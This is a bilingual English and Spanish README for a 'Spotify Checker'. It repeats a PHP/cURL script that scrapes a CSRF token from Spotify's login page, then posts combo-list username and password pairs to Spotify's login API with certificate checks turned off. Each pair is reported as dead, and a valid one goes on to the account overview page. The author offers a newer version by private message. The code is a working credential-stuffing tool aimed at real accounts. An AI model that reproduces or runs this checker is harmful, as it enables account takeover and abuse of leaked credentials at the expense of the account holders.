# 🎶Spotify Checker🎶

> Language: EN (ENGLISH)

✔ Account Checker Spotify based on curl and php. ✔

```php
$ch = curl_init();
      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_VERBOSE, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
      ));
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
      $res = curl_exec($ch);
      preg_match_all("|Set-Cookie: csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $res, $csrf);
      $csrf = trim($csrf[1][0]);

      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Content-Type: application/x-www-form-urlencoded",
            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
      ));
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$pisah[0]&password=$pisah[1]&csrf_token=$csrf");
      $res = curl_exec($ch);
      $res = json_decode($res);
      $email = urldecode($pisah[0]);
      if(isset($res->error) && trim($res->error) == "errorInvalidCredentials" ) {
      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$pisah[0].'<font color=gray>|</font>'.$pisah[1].'"}';
      } elseif(isset($res->displayName) || stripos($json_encode($res), "displayName")) {
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));
```


###  ⛔This version of the checker is outdated, if you want the new and improved version just send me a private message 🌐📩

### Files included 📂

- index.php
- check.php


================================================================

> Idioma: ES (Español)

 ✔Checker Cuentas de Spotify basado en cURL y PHP. ✔
 
 ```php
$ch = curl_init();
      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_VERBOSE, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
      ));
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
      $res = curl_exec($ch);
      preg_match_all("|Set-Cookie: csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $res, $csrf);
      $csrf = trim($csrf[1][0]);

      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Content-Type: application/x-www-form-urlencoded",
            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
      ));
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$pisah[0]&password=$pisah[1]&csrf_token=$csrf");
      $res = curl_exec($ch);
      $res = json_decode($res);
      $email = urldecode($pisah[0]);
      if(isset($res->error) && trim($res->error) == "errorInvalidCredentials" ) {
      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$pisah[0].'<font color=gray>|</font>'.$pisah[1].'"}';
      } elseif(isset($res->displayName) || stripos($json_encode($res), "displayName")) {
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));
```

###  ⛔Esta versión del checker esta desactualizada, si quieres la versión nueva y mejorada solo debes enviarme un mensaje privado 🌐📩

### Archivos incluidos 📂

- index.php
- check.php
